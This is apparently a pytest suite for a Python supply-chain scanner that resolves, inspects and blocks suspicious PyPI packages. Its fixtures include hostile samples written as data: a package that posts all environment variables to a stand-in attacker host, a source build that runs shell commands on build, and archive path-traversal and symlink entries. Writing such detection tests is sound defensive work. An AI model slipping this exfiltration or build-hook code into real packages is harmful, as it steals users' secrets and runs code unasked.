"""Synthetic PyPI artifacts are inert data; no package module/build hook runs."""
import hashlib
import io
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tarfile
import zipfile

import pytest

from backend.guardian import pypi_adapter as pypi
from backend.guardian.supply_models import AcquisitionError, Artifact, IntegrityError, InstallError, Plan


def wheel(name='guardian_benign', version='1.0.0', code='VALUE = 42\n', requires=(), extra_files=None, extras=()):
    filename = f'{name}-{version}-py3-none-any.whl'
    info = f'{name}-{version}.dist-info'
    files = {f'{name}/__init__.py': code,
             f'{info}/METADATA': f'Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n' + ''.join(f'Requires-Dist: {r}\n' for r in requires) + ''.join(f'Provides-Extra: {e}\n' for e in extras),
             f'{info}/WHEEL': 'Wheel-Version: 1.0\nGenerator: guardian-tests\nRoot-Is-Purelib: true\nTag: py3-none-any\n'}
    files.update(extra_files or {})
    files[f'{info}/RECORD'] = ''.join(path + ',,\n' for path in list(files) + [f'{info}/RECORD'])
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, 'w') as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return filename, stream.getvalue()


def registry(monkeypatch, distributions):
    calls = []
    metadata = {}
    downloads = {}
    for (name, version), value in distributions.items():
        filename, raw = value
        normalized = name.replace('_', '-').lower()
        url = 'https://files.pythonhosted.org/packages/' + filename
        downloads[url] = raw
        metadata.setdefault(normalized, {'releases': {}})['releases'][version] = [{'filename': filename, 'url': url, 'digests': {'sha256': hashlib.sha256(raw).hexdigest()}, 'packagetype': 'bdist_wheel' if filename.endswith('.whl') else 'sdist', 'yanked': False}]
    def fetch(url, **kwargs):
        calls.append(url)
        if url.startswith('https://pypi.org/pypi/'):
            return json.dumps(metadata[url.split('/')[-2]]).encode()
        return downloads[url]
    monkeypatch.setattr(pypi, 'download_pypi_url', fetch)
    return calls, metadata, downloads


def test_direct_and_transitive_metadata_resolution(monkeypatch, tmp_path):
    calls, _, _ = registry(monkeypatch, {
        ('guardian_root', '1.0.0'): wheel('guardian_root', requires=['guardian-child>=1; python_version>="3"', 'excluded-child; python_version<"2"']),
        ('guardian_child', '1.0.0'): wheel('guardian_child'),
        ('guardian_child', '2.0.0'): wheel('guardian_child', '2.0.0')})
    plan = pypi.resolve(['guardian-root==1.0.0'], tmp_path)
    assert plan.complete and len(plan.artifacts) == 2
    assert plan.artifacts[0].dependencies == ['pypi:guardian-child@2.0.0']
    assert plan.artifacts[1].version == '2.0.0' and not plan.artifacts[1].direct
    assert all(a.verified and a.sha256 == hashlib.sha256(a.raw).hexdigest() for a in plan.artifacts)
    assert not any('excluded-child' in url for url in calls)


def test_backtracks_conflicting_transitive_constraints(monkeypatch, tmp_path):
    registry(monkeypatch, {
        ('parent-a', '1.0.0'): wheel('parent_a', requires=['shared-child<2']),
        ('parent-a', '2.0.0'): wheel('parent_a', '2.0.0', requires=['shared-child>=2']),
        ('parent-b', '1.0.0'): wheel('parent_b', requires=['shared-child<2']),
        ('shared-child', '1.0.0'): wheel('shared_child'),
        ('shared-child', '2.0.0'): wheel('shared_child', '2.0.0')})
    plan = pypi.resolve(['parent-a', 'parent-b'], tmp_path)
    assert {a.name: a.version for a in plan.artifacts} == {'parent-a': '1.0.0', 'parent-b': '1.0.0', 'shared-child': '1.0.0'}


def test_extras_marker_resolution(monkeypatch, tmp_path):
    registry(monkeypatch, {
        ('guardian-root', '1.0.0'): wheel('guardian_root', requires=['guardian-child; extra == "optional"'], extras=['optional']),
        ('guardian-child', '1.0.0'): wheel('guardian_child')})
    assert len(pypi.resolve(['guardian-root'], tmp_path).artifacts) == 1
    assert len(pypi.resolve(['guardian-root[optional]'], tmp_path).artifacts) == 2


def test_hash_mismatch_refuses_inspection(monkeypatch, tmp_path):
    _, _, downloads = registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    downloads[next(iter(downloads))] = b'altered'
    monkeypatch.setattr(pypi, '_inspect', lambda *a, **k: pytest.fail('Unverified bytes must not be extracted'))
    with pytest.raises(IntegrityError, match='SHA-256'):
        pypi.resolve(['guardian-benign'], tmp_path)


def test_url_dependency_never_fetched(monkeypatch, tmp_path):
    calls, _, _ = registry(monkeypatch, {('guardian-root', '1.0.0'): wheel('guardian_root', requires=['remote @ https://evil.example/payload.whl'])})
    with pytest.raises(AcquisitionError, match='URL'):
        pypi.resolve(['guardian-root'], tmp_path)
    assert all('evil.example' not in url for url in calls)


def test_unsafe_registry_url_rejected(monkeypatch, tmp_path):
    _, metadata, _ = registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    metadata['guardian-benign']['releases']['1.0.0'][0]['url'] = 'https://evil.example/file.whl'
    with pytest.raises(AcquisitionError, match='unsupported artifact URL'):
        pypi.resolve(['guardian-benign'], tmp_path)


def test_archive_traversal_and_links_rejected():
    filename, raw = wheel(extra_files={'../escape.py': 'raise RuntimeError()'})
    with pytest.raises(AcquisitionError, match='unsafe'):
        pypi._inspect(raw, filename)
    filename, raw = wheel()
    stream = io.BytesIO(raw)
    with zipfile.ZipFile(stream, 'a') as archive:
        info = zipfile.ZipInfo('linked.py')
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, '../escape')
    with pytest.raises(AcquisitionError, match='links'):
        pypi._inspect(stream.getvalue(), filename)


def test_embedded_identity_must_match_filename():
    filename, raw = wheel()
    with pytest.raises(IntegrityError, match='identity'):
        pypi._inspect(raw, filename.replace('guardian_benign', 'other_name'))


def sdist(sentinel):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode='w:gz') as archive:
        for path, content in {
            'guardian_source-1.0.0/setup.py': f'import os\nos.system("touch {sentinel}")\n',
            'guardian_source-1.0.0/pyproject.toml': '[build-system]\nrequires=[]\nbuild-backend="malicious_backend"\n',
            'guardian_source-1.0.0/malicious_backend.py': f'from pathlib import Path\nPath({str(sentinel)!r}).write_text("executed")\n'}.items():
            data = content.encode()
            item = tarfile.TarInfo(path)
            item.size = len(data)
            archive.addfile(item, io.BytesIO(data))
    return 'guardian_source-1.0.0.tar.gz', stream.getvalue()


def test_sdist_static_inspection_never_builds(monkeypatch, tmp_path):
    sentinel = tmp_path / 'executed'
    registry(monkeypatch, {('guardian-source', '1.0.0'): sdist(sentinel)})
    plan = pypi.resolve(['guardian-source'], tmp_path)
    assert not plan.complete and plan.artifacts[0].kind == 'sdist'
    from backend.guardian.core import analyze_plan
    report = analyze_plan(plan)
    assert any(f.rule == 'PYTHON_BUILD_HOOK' for f in report.findings)
    assert report.cli['decision']['decision'] in {'BLOCK', 'REVIEW'}
    with pytest.raises(InstallError, match='source builds'):
        pypi.install(plan, tmp_path)
    assert not sentinel.exists()


def test_malicious_python_wheel_blocked_before_install(monkeypatch, tmp_path):
    code = 'import os, requests\nrequests.post("https://evil.invalid/steal", json=dict(os.environ))\n'
    registry(monkeypatch, {('guardian-malicious', '1.0.0'): wheel('guardian_malicious', code=code)})
    plan = pypi.resolve(['guardian-malicious'], tmp_path)
    from backend.guardian.core import analyze_plan
    report = analyze_plan(plan)
    assert report.cli['decision']['decision'] == 'BLOCK'
    assert any(f.rule == 'SENSITIVE_TRANSMISSION' for f in report.findings)
    assert all(f.artifact_sha256 == plan.artifacts[0].sha256 for f in report.findings)


def test_offline_local_scanning(tmp_path):
    filename, raw = wheel()
    path = tmp_path / filename
    path.write_bytes(raw)
    artifact = pypi.acquire_local(path)
    assert not artifact.verified and artifact.kind == 'wheel'
    with pytest.raises(AcquisitionError, match='Offline'):
        pypi.resolve(['guardian-benign'], tmp_path, offline=True)


def test_manifest_restrictions_and_existing_constraints(monkeypatch, tmp_path):
    (tmp_path / 'requirements.txt').write_text('guardian-child<2\n')
    registry(monkeypatch, {('guardian-child', '1.0.0'): wheel('guardian_child'), ('guardian-child', '2.0.0'): wheel('guardian_child', '2.0.0')})
    assert pypi.resolve(['guardian-child>=1'], tmp_path).artifacts[0].version == '1.0.0'
    (tmp_path / 'requirements.txt').write_text('--index-url https://evil.example\n')
    with pytest.raises(AcquisitionError, match='directives'):
        pypi.resolve([], tmp_path)


def test_install_changed_bytes_refused(monkeypatch, tmp_path):
    filename, raw = wheel()
    artifact, _, _ = pypi._inspect(raw, filename, True)
    artifact.raw += b'changed'
    target = tmp_path / 'env'
    (target / 'bin').mkdir(parents=True)
    (target / 'pyvenv.cfg').write_text('')
    (target / 'bin/python').write_text('')
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    with pytest.raises(IntegrityError, match='changed'):
        pypi.install(Plan('pypi', [artifact], [artifact.identity], installer_data=pypi._installation_context(tmp_path)), tmp_path)


def test_real_benign_wheel_installation_exact_bytes(monkeypatch, tmp_path):
    target = tmp_path / 'environment'
    subprocess.run([sys.executable, '-m', 'venv', str(target)], check=True, capture_output=True, timeout=60)
    registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    plan = pypi.resolve(['guardian-benign'], tmp_path)
    from backend.guardian.core import analyze_plan
    report = analyze_plan(plan)
    assert report.cli['decision']['decision'] == 'ALLOW'
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    pypi.install(plan, tmp_path)
    installed = list(target.glob('lib/python*/site-packages/guardian_benign/__init__.py'))
    assert len(installed) == 1 and installed[0].read_bytes() == b'VALUE = 42\n'
    installed[0].write_text('ALTERED = True\n')
    pypi.install(plan, tmp_path)
    assert installed[0].read_bytes() == b'VALUE = 42\n'
    assert not list(tmp_path.glob('guardian-wheels-*'))


def test_install_failure_reported(monkeypatch, tmp_path):
    filename, raw = wheel()
    artifact, _, _ = pypi._inspect(raw, filename, True)
    target = tmp_path / 'env'
    (target / 'bin').mkdir(parents=True)
    (target / 'pyvenv.cfg').write_text('')
    (target / 'bin/python').write_text('')
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    monkeypatch.setattr(subprocess, 'run', lambda *a, **k: subprocess.CompletedProcess(a[0], 0, json.dumps(pypi._runtime_fingerprint()), '') if '-S' in a[0] else subprocess.CompletedProcess(a[0], 1, '', 'synthetic failure'))
    with pytest.raises(InstallError, match='partially changed'):
        pypi.install(Plan('pypi', [artifact], [artifact.identity], installer_data=pypi._installation_context(tmp_path)), tmp_path)


def test_native_binary_requires_review(monkeypatch, tmp_path):
    registry(monkeypatch, {('guardian-native', '1.0.0'): wheel('guardian_native', extra_files={'guardian_native/opaque.so': b'\x7fELF'})})
    from backend.guardian.core import analyze_plan
    report = analyze_plan(pypi.resolve(['guardian-native'], tmp_path))
    assert report.cli['decision']['decision'] == 'REVIEW'


@pytest.mark.parametrize('payload', ['dict(os.environ)', 'os.environ["TOKEN"]', 'os.getenv("TOKEN")', '{"token": os.environ.get("TOKEN")}'])
def test_direct_environment_argument_flow_is_detected(payload):
    from backend.guardian.py_engine import analyze_python
    findings, _, _ = analyze_python({'payload.py': 'import os, requests\nrequests.post("https://example.invalid/", json=' + payload + ')\n'})
    flows = [f for f in findings if f.rule == 'SENSITIVE_TRANSMISSION']
    assert flows and flows[0].confidence == 'high'
    assert flows[0].data_flows[0].steps[0].file == 'payload.py'
    assert flows[0].data_flows[0].steps[0].line == 2


@pytest.mark.parametrize('code', [
    'import os, requests\nprint(os.environ.get("MODE"))\nrequests.get("https://example.invalid/public")',
    'import os, requests\nrequests.post("https://example.invalid/public", json={"public": "value"})',
    'import os, requests\nrequests.post("https://example.invalid/public", json={"literal": "os.environ"})',
])
def test_unrelated_environment_read_and_public_requests_are_benign(code):
    from backend.guardian.py_engine import analyze_python
    findings, _, _ = analyze_python({'benign.py': code})
    assert not any(f.rule == 'SENSITIVE_TRANSMISSION' for f in findings)


def test_cli_malicious_install_stops_before_pip(monkeypatch, tmp_path, capsys):
    from backend.guardian.cli import main, EXIT_BLOCK
    marker = tmp_path / 'package_executed'
    code = ('import os, requests\nrequests.post("https://evil.invalid/steal", json=dict(os.environ))\n'
            f'open({str(marker)!r}, "w").write("executed")\n')
    registry(monkeypatch, {('guardian-malicious', '1.0.0'): wheel('guardian_malicious', code=code)})
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GUARDIAN_HOME', str(tmp_path / 'reports'))
    monkeypatch.setattr(pypi, 'install', lambda *a, **kw: pytest.fail('A blocked graph must never reach pip'))
    assert main(['install', '--ecosystem', 'pypi', '--json', 'guardian-malicious']) == EXIT_BLOCK
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['installation']['status'] == 'blocked before installation'
    assert not marker.exists()


def test_cli_offline_sdist_inspects_without_network_or_build(monkeypatch, tmp_path, capsys):
    from backend.guardian.cli import main
    marker = tmp_path / 'build_executed'
    filename, raw = sdist(marker)
    (tmp_path / filename).write_bytes(raw)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GUARDIAN_HOME', str(tmp_path / 'reports'))
    monkeypatch.setattr(pypi, 'download_pypi_url', lambda *a, **k: pytest.fail('Offline check must not use the network'))
    assert main(['check', '--ecosystem', 'pypi', '--offline', '--json', filename]) in {2, 3}
    report = json.loads(capsys.readouterr().out)
    assert report['findings'] and report['cli']['installation']['status'] == 'not attempted'
    assert not marker.exists()


@pytest.mark.parametrize('manifest', ['requirements.txt', 'pyproject.toml'])
def test_resolve_rejects_symlinked_dependency_manifests(monkeypatch, tmp_path, manifest):
    source = tmp_path / 'elsewhere.txt'
    source.write_text('guardian-benign==1.0.0\n')
    (tmp_path / manifest).symlink_to(source)
    monkeypatch.setattr(pypi, 'download_pypi_url', lambda *a, **k: pytest.fail('Symlink preflight must precede network'))
    with pytest.raises(AcquisitionError, match='symbolic links'):
        pypi.resolve(['guardian-benign'], tmp_path)


@pytest.mark.parametrize('change', ['modify', 'remove', 'create', 'symlink'])
def test_install_refuses_changed_dependency_manifests_before_pip(monkeypatch, tmp_path, change):
    manifest = tmp_path / 'requirements.txt'
    if change != 'create':
        manifest.write_text('guardian-benign==1.0.0\n')
    registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    plan = pypi.resolve(['guardian-benign'], tmp_path)
    assert plan.installer_data['project_manifests']['requirements.txt'] == (hashlib.sha256(manifest.read_bytes()).hexdigest() if manifest.exists() else None)
    if change == 'remove':
        manifest.unlink()
    elif change == 'symlink':
        manifest.unlink()
        (tmp_path / 'new.txt').write_text('guardian-benign==1.0.0\n')
        manifest.symlink_to(tmp_path / 'new.txt')
    else:
        manifest.write_text('guardian-benign==2.0.0\n')
    monkeypatch.setattr(subprocess, 'run', lambda *a, **k: pytest.fail('Manifest change must block every subprocess'))
    with pytest.raises(InstallError, match='manifest'):
        pypi.install(plan, tmp_path)


def test_target_interpreter_mismatch_blocks_pip(monkeypatch, tmp_path):
    registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    plan = pypi.resolve(['guardian-benign'], tmp_path)
    target = tmp_path / 'target'
    (target / 'bin').mkdir(parents=True)
    (target / 'pyvenv.cfg').write_text('')
    (target / 'bin/python').write_text('')
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    commands = []
    def run(argv, **kwargs):
        commands.append(argv)
        assert '-S' in argv and '-c' in argv and 'pip' not in argv
        fingerprint = pypi._runtime_fingerprint()
        fingerprint[0] = [2, 7, 18]
        return subprocess.CompletedProcess(argv, 0, json.dumps(fingerprint), '')
    monkeypatch.setattr(subprocess, 'run', run)
    with pytest.raises(InstallError, match='differs from the resolving interpreter'):
        pypi.install(plan, tmp_path)
    assert len(commands) == 1


def test_explicit_spec_does_not_ignore_existing_unsupported_lock(monkeypatch, tmp_path):
    (tmp_path / 'uv.lock').write_text('version = 1\n')
    monkeypatch.setattr(pypi, 'download_pypi_url', lambda *a, **k: pytest.fail('Unsupported lock must block resolution'))
    with pytest.raises(AcquisitionError, match='cannot preserve'):
        pypi.resolve(['guardian-benign'], tmp_path)


def test_manifest_change_during_target_preflight_blocks_pip(monkeypatch, tmp_path):
    registry(monkeypatch, {('guardian-benign', '1.0.0'): wheel()})
    plan = pypi.resolve(['guardian-benign'], tmp_path)
    target = tmp_path / 'target'
    (target / 'bin').mkdir(parents=True)
    (target / 'pyvenv.cfg').write_text('')
    (target / 'bin/python').write_text('')
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    commands = []
    def run(argv, **kwargs):
        commands.append(argv)
        assert '-S' in argv and 'pip' not in argv
        (tmp_path / 'requirements.txt').write_text('guardian-benign==2.0.0\n')
        return subprocess.CompletedProcess(argv, 0, json.dumps(pypi._runtime_fingerprint()), '')
    monkeypatch.setattr(subprocess, 'run', run)
    with pytest.raises(InstallError, match='changed before pip'):
        pypi.install(plan, tmp_path)
    assert len(commands) == 1
